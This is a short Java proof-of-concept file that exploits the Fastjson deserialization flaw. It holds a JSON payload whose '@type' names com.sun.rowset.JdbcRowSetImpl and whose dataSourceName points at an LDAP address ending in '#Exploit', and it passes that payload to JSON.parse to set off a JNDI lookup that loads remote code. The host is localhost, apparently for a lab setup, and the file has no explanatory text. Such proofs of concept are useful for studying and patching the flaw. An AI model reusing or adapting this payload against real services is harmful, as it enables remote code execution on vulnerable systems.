package JDBC;

import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

public class POC {
    public static void main(String[] args) {
        String st = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://localhost:1099/#Exploit\", \"autoCommit\":true}";
        JSON.parse(st);
    }
}
